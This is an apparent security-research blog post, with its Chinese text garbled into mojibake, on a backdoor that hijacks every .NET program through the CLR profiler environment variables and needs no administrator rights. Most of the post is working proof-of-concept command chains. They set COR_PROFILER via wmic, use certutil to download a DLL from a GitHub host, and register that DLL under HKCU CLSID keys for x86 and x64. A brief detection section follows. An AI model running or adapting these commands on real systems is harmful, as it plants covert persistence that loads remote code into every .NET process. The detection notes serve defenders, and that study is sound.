I"ˆ+<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/Use-AppDomainManager-to-maintain-persistence">ã€ŠUse AppDomainManager to maintain persistenceã€‹</a>ä»‹ç»äº†é€šè¿‡AppDomainManagerå®ç°çš„ä¸€ç§è¢«åŠ¨åé—¨è§¦å‘æœºåˆ¶ï¼Œæ¼”ç¤ºäº†å¦‚ä½•åŠ«æŒç³»ç»Ÿ.Netç¨‹åºpowershell_ise.exeï¼Œä½†å‰ææ˜¯éœ€è¦è·å¾—ç®¡ç†å‘˜æƒé™ã€‚
è¿™ä¸€æ¬¡å°†æ›´è¿›ä¸€æ­¥ï¼Œä»‹ç»ä¸€ç§æ— éœ€ç®¡ç†å‘˜æƒé™çš„åé—¨ï¼Œå¹¶èƒ½å¤ŸåŠ«æŒæ‰€æœ‰.Netç¨‹åºã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>CLRçš„ä½¿ç”¨</li>
  <li>åé—¨å¼€å‘æ€è·¯</li>
  <li>POCç¼–å†™</li>
  <li>åé—¨æ£€æµ‹</li>
</ul>

<h2 id="0x02-clrçš„ä½¿ç”¨">0x02 CLRçš„ä½¿ç”¨</h2>
<hr />

<p><strong>CLRï¼š</strong></p>

<p>å…¨ç§°Common Language Runtimeï¼ˆå…¬å…±è¯­è¨€è¿è¡Œåº“ï¼‰ï¼Œæ˜¯ä¸€ä¸ªå¯ç”±å¤šç§ç¼–ç¨‹è¯­è¨€ä½¿ç”¨çš„è¿è¡Œç¯å¢ƒã€‚</p>

<p>CLRæ˜¯.NET Frameworkçš„ä¸»è¦æ‰§è¡Œå¼•æ“ï¼Œä½œç”¨ä¹‹ä¸€æ˜¯ç›‘è§†ç¨‹åºçš„è¿è¡Œï¼š</p>

<ul>
  <li>åœ¨CLRç›‘è§†ä¹‹ä¸‹è¿è¡Œçš„ç¨‹åºå±äºâ€œæ‰˜ç®¡çš„â€ï¼ˆmanagedï¼‰ä»£ç </li>
  <li>ä¸åœ¨CLRä¹‹ä¸‹ã€ç›´æ¥åœ¨è£¸æœºä¸Šè¿è¡Œçš„åº”ç”¨æˆ–è€…ç»„ä»¶å±äºâ€œéæ‰˜ç®¡çš„â€ï¼ˆunmanagedï¼‰çš„ä»£ç </li>
</ul>

<p><strong>CLRçš„ä½¿ç”¨ï¼š</strong></p>

<p>æµ‹è¯•ç³»ç»Ÿï¼š Win8 x86</p>

<h3 id="1å¯åŠ¨cmd">1ã€å¯åŠ¨cmd</h3>

<p>è¾“å…¥å¦‚ä¸‹ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET COR_ENABLE_PROFILING=1
SET COR_PROFILER={11111111-1111-1111-1111-111111111111}
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p><code class="language-plaintext highlighter-rouge">{11111111-1111-1111-1111-111111111111}</code>è¡¨ç¤ºCLSID</p>

<p>å¯è®¾ç½®ä¸ºä»»æ„æ•°å€¼ï¼Œåªè¦ä¸å’Œç³»ç»Ÿå¸¸ç”¨CLSIDå†²çªå°±å¥½</p>

<h3 id="2æµ‹è¯•dll">2ã€æµ‹è¯•dll</h3>

<p>ä½¿ç”¨å¼¹æ¡†dllï¼Œä¸‹è½½åœ°å€ï¼š</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/msg.dll</p>

<p>dllå¼€å‘è¿‡ç¨‹å¯å‚è€ƒï¼š</p>

<p>https://3gstudent.github.io/Use-Office-to-maintain-persistence</p>

<p>å¯åœ¨cmdä¸‹å®ç°ç›´æ¥ä¸‹è½½ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
</code></pre></div></div>

<p>æ“ä½œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-1.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>deleteæ˜¯ä¸ºäº†æ¸…é™¤ä¸‹è½½æ–‡ä»¶çš„ç¼“å­˜</p>

<p>æ›´å¤šå…³äºä½¿ç”¨certutil.exeä¸‹è½½æ–‡ä»¶çš„åˆ©ç”¨ç»†èŠ‚å¯å‚è€ƒæ–‡ç« ï¼š</p>

<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84certutil.exe">ã€Šæ¸—é€æµ‹è¯•ä¸­çš„certutil.exeã€‹</a></p>

<h3 id="3æ“ä½œæ³¨å†Œè¡¨">3ã€æ“ä½œæ³¨å†Œè¡¨</h3>

<p>æ³¨å†Œè¡¨è·¯å¾„ï¼š<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\CLSID\</code></p>

<p>æ–°å»ºå­é¡¹<code class="language-plaintext highlighter-rouge">{11111111-1111-1111-1111-111111111111}</code>ï¼ŒåŒæ­¥éª¤1 cmdè¾“å…¥çš„CLSIDå¯¹åº”
æ–°å»ºå­é¡¹<code class="language-plaintext highlighter-rouge">InProcServer32</code>
æ–°å»ºé”®å€¼<code class="language-plaintext highlighter-rouge">REG_SZ ThreadingModelï¼šApartment</code>
é»˜è®¤è·¯å¾„æ”¹ä¸ºmsg.dllçš„è·¯å¾„</p>

<p>ä¿®æ”¹åçš„æ³¨å†Œè¡¨å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-2.png" alt="Alt text" /></p>

<p>å¯¹åº”cmdä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
</code></pre></div></div>

<h3 id="4åœ¨å½“å‰cmdå¯åŠ¨netç¨‹åº">4ã€åœ¨å½“å‰cmdå¯åŠ¨.netç¨‹åº</h3>

<p>ä¾‹å¦‚powershell.exeï¼Œå¯åŠ¨æ—¶åŠ è½½msg.dllï¼Œå¼¹æ¡†</p>

<p>æ“ä½œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-3.png" alt="Alt text" /></p>

<p><strong>æ³¨:</strong></p>

<p>ä½¿ç”¨å…¶ä»–cmdæ‰§è¡Œpowershell.exeä¸ä¼šåŠ è½½msg.dll</p>

<p><strong>åŸå› ï¼š</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SET COR_ENABLE_PROFILING=1
SET COR_PROFILER={11111111-1111-1111-1111-111111111111}
</code></pre></div></div>

<p>åªä½œç”¨äºå½“å‰cmdï¼Œå¯é€šè¿‡cmdå‘½ä»¤<code class="language-plaintext highlighter-rouge">"set"</code>åˆ¤æ–­</p>

<p>å½“ç„¶ï¼Œæ‰§è¡Œå…¶ä»–.netç¨‹åºä¹Ÿä¼šåŠ è½½msg.dll</p>

<p>æµ‹è¯•å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/2-4.png" alt="Alt text" /></p>

<h2 id="0x03-åé—¨å¼€å‘æ€è·¯">0x03 åé—¨å¼€å‘æ€è·¯</h2>
<hr />

<p>ç”±ä»¥ä¸Šæµ‹è¯•å¾—å‡ºç»“è®ºï¼Œä½¿ç”¨CLRèƒ½å¤ŸåŠ«æŒæ‰€æœ‰.Netç¨‹åºçš„å¯åŠ¨ï¼Œä½†æ˜¯åªèƒ½ä½œç”¨äºå½“å‰cmd</p>

<p>èƒ½å¦ä½œç”¨äºå…¨å±€å‘¢ï¼Ÿ</p>

<p>è‡ªç„¶æƒ³åˆ°äº†ä¿®æ”¹ç¯å¢ƒå˜é‡</p>

<p>é€šå¸¸ï¼Œä¿®æ”¹ç¯å¢ƒå˜é‡ä½¿ç”¨é¢æ¿æ“ä½œçš„æ–¹å¼ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/3-1.png" alt="Alt text" /></p>

<p>èƒ½å¦é€šè¿‡å‘½ä»¤è¡Œä¿®æ”¹ç¯å¢ƒå˜é‡å‘¢ï¼Ÿ</p>

<p>è‡ªç„¶æƒ³åˆ°äº†WMI</p>

<p>ä¿®æ”¹ç³»ç»Ÿå˜é‡ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">wmic ENVIRONMENT create name="1",username="&lt;system&gt;",VariableValue="1"</code></p>

<p>ä¿®æ”¹å½“å‰ç”¨æˆ·å˜é‡ï¼ˆå½“å‰ç”¨æˆ·æƒé™ï¼‰ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">wmic ENVIRONMENT create name="2",username="%username%",VariableValue="2"</code></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>é€šè¿‡WMIä¿®æ”¹ç¯å¢ƒå˜é‡éœ€è¦ç³»ç»Ÿé‡å¯æˆ–æ³¨é”€é‡æ–°ç™»å½•æ‰èƒ½ç”Ÿæ•ˆ</p>

<p>æ¥ä¸‹æ¥éœ€è¦æµ‹è¯•ï¼Œæ˜¯å¦åªéœ€è¦ä¿®æ”¹å½“å‰ç”¨æˆ·æƒé™å°±èƒ½å¤Ÿå®ç°ä½œç”¨äºå…¨å±€ï¼Œç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚</p>

<p>æ·»åŠ å½“å‰ç”¨æˆ·çš„ç¯å¢ƒå˜é‡ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"

wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
</code></pre></div></div>

<p>é‡å¯åï¼ŒæˆåŠŸä¿®æ”¹ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/3-2.png" alt="Alt text" /></p>

<p>ç°åœ¨ç›´æ¥å¯åŠ¨.Netç¨‹åºï¼Œå¼¹æ¡†ï¼ŒæˆåŠŸåŠ è½½msg.dll</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-7-28/3-3.png" alt="Alt text" /></p>

<p>è‡³æ­¤ï¼Œåé—¨æ€è·¯éªŒè¯æˆåŠŸ</p>

<h2 id="0x04-pocç¼–å†™">0x04 POCç¼–å†™</h2>
<hr />

<p>å¯¹äº32ä½æ“ä½œç³»ç»Ÿï¼Œå‚è€ƒ0x03çš„ä»£ç å°±å¥½ï¼Œx86 POCå¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
</code></pre></div></div>

<p>å¯¹åº”64ä½ç³»ç»Ÿï¼Œéœ€è¦æ³¨æ„é‡å®šå‘é—®é¢˜ï¼Œæ³¨å†Œè¡¨å­˜åœ¨32ä½å’Œ64ä½ä¸¤ä¸ªä½ç½®</p>

<p><strong>æ³¨:</strong></p>

<p>æ›´å¤šå…³äº64ä½ç³»ç»Ÿçš„é‡å®šå‘ç»†èŠ‚å¯å‚è€ƒæ–‡ç« ã€Šå…³äº32ä½ç¨‹åºåœ¨64ä½ç³»ç»Ÿä¸‹è¿è¡Œä¸­éœ€è¦æ³¨æ„çš„é‡å®šå‘é—®é¢˜ã€‹</p>

<p>ç»“åˆåˆ°æœ¬æ–‡ï¼Œ32ä½éœ€è¦å¯¹åº”32ä½çš„dllï¼Œ64ä½å¯¹åº”64ä½çš„dll</p>

<p>æ‰€ä»¥ï¼Œéœ€è¦å‡†å¤‡64ä½çš„dllï¼Œä¸‹è½½åœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll</p>

<p>è¿‡ç¨‹ä¸å†èµ˜è¿°ï¼Œ64ä½POCå¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg.dll delete
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/3gstudent/test/master/msg_x64.dll delete
SET KEY=HKEY_CURRENT_USER\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg_x64.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F 
SET KEY=HKEY_CURRENT_USER\Software\Classes\WoW6432Node\CLSID\{11111111-1111-1111-1111-111111111111}\InProcServer32
REG.EXE ADD %KEY% /VE /T REG_SZ /D "%CD%\msg.dll" /F
REG.EXE ADD %KEY% /V ThreadingModel /T REG_SZ /D Apartment /F
</code></pre></div></div>

<p>èƒ½å¤Ÿåˆ†åˆ«åŠ«æŒ32ä½å’Œ64ä½çš„.Netç¨‹åºï¼Œå®Œæ•´æµ‹è¯•å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/CLR-Injection/master/poc.gif" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æ›´å¤šä»£ç ç»†èŠ‚å¯è§githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/CLR-Injection</p>

<h2 id="0x05-åé—¨æ£€æµ‹">0x05 åé—¨æ£€æµ‹</h2>
<hr />

<p>ç»“åˆåˆ©ç”¨æ–¹å¼ï¼Œæ£€æµ‹æ–¹æ³•å¦‚ä¸‹ï¼š</p>

<ul>
  <li>æ£€æŸ¥ç¯å¢ƒå˜é‡<code class="language-plaintext highlighter-rouge">COR_ENABLE_PROFILING</code>å’Œ<code class="language-plaintext highlighter-rouge">COR_PROFILER</code></li>
  <li>æ£€æŸ¥æ³¨å†Œè¡¨é”®å€¼<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\CLSID\</code></li>
</ul>

<h2 id="0x06-å°ç»“">0x06 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†é€šè¿‡CLRåŠ«æŒ.Netç¨‹åºçš„åé—¨ï¼Œç‰¹ç‚¹æ˜¯æ— éœ€ç®¡ç†å‘˜æƒé™ï¼Œå¹¶èƒ½å¤ŸåŠ«æŒæ‰€æœ‰.Netç¨‹åºã€‚æ›´é‡è¦çš„æ˜¯,ç³»ç»Ÿé»˜è®¤ä¼šè°ƒç”¨.netç¨‹åº,å¯¼è‡´åé—¨è‡ªåŠ¨è§¦å‘ã€‚</p>

<h2 id="0x07-è¡¥å……20171023">0x07 è¡¥å……(20171023)</h2>

<p>Stefan Kanthakå‘ç°äº†è¿™ç§åˆ©ç”¨æ–¹æ³•ï¼Œå¹¶ä¸”å…¬å¼€çš„æ—¶é—´æ¯”æˆ‘è¦æ—©ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>http://seclists.org/fulldisclosure/2017/Jul/11</p>

<p>å¹¶ä¸”ï¼Œä»–åˆ©ç”¨CLRè¿˜å®ç°äº†UACç»•è¿‡(è¿™ä¸ªæ€è·¯æˆ‘æ˜¯åæ¥ä»clem@clavoillotteçš„åšå®¢å­¦åˆ°çš„)ï¼Œè¯¥æ–¹æ³•æˆ‘ä¹Ÿåšäº†ç ”ç©¶å¹¶å†™äº†ä¸€ç¯‡ç ”ç©¶å¿ƒå¾—ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p><a href="https://3gstudent.github.io/Use-CLR-to-bypass-UAC">ã€ŠUse CLR to bypass UACã€‹</a></p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET